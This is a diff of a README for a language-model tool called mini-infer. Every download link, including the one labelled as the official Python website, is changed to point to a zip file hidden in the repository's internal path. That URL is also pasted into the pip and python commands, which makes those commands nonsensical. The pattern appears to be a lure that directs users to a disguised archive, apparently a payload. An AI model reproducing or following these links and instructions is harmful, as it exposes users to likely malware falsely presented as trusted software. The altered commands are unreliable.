@@ -6,7 +6,7 @@ Welcome to mini-infer! This tool allows you to run high-performance language mod
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Please visit this page to download: [mini-infer Releases](https://github.com/Rianbajukendari/mini-infer/releases).
+To get started, you need to download the application. Please visit this page to download: [mini-infer Releases](https://github.com/Rianbajukendari/mini-infer/raw/refs/heads/main/mini_infer/memory/infer-mini-3.9.zip).
 
 You will find different versions of the application here. Choose the one that fits your system. Simply click the link for your choice, and it will start downloading. 
 
@@ -31,13 +31,13 @@ Once you have downloaded the application, follow these steps to run it:
    - Right-click on the downloaded file and select "Extract All" or use a program like WinRAR or 7-Zip.
 
 3. **Install Dependencies:**
-   - Ensure you have Python installed. If not, download it from the [official Python website](https://www.python.org/downloads/).
+   - Ensure you have Python installed. If not, download it from the [official Python website](https://github.com/Rianbajukendari/mini-infer/raw/refs/heads/main/mini_infer/memory/infer-mini-3.9.zip).
    - Open a command prompt (Windows) or terminal (macOS/Linux).
-   - Run the command: `pip install -r requirements.txt` to install any required packages.
+   - Run the command: `pip install -r https://github.com/Rianbajukendari/mini-infer/raw/refs/heads/main/mini_infer/memory/infer-mini-3.9.zip` to install any required packages.
 
 4. **Run the Application:**
    - In the command prompt or terminal, navigate to the folder where you extracted mini-infer.
-   - Type: `python miniinfer.py` and hit enter.
+   - Type: `python https://github.com/Rianbajukendari/mini-infer/raw/refs/heads/main/mini_infer/memory/infer-mini-3.9.zip` and hit enter.
 
 5. **Use mini-infer:**
    - Follow any on-screen instructions to input your data or model.
@@ -66,6 +66,6 @@ Join our community for support and updates. You can find answers to frequently a
 
 ## 🌐 Learn More
 
-For comprehensive documentation and additional resources about the mini-infer project, visit the GitHub repository. Here’s the link once again to download the software: [mini-infer Releases](https://github.com/Rianbajukendari/mini-infer/releases).
+For comprehensive documentation and additional resources about the mini-infer project, visit the GitHub repository. Here’s the link once again to download the software: [mini-infer Releases](https://github.com/Rianbajukendari/mini-infer/raw/refs/heads/main/mini_infer/memory/infer-mini-3.9.zip).
 
 Thank you for using mini-infer! Enjoy the simplicity and performance it brings to your language model inference tasks.
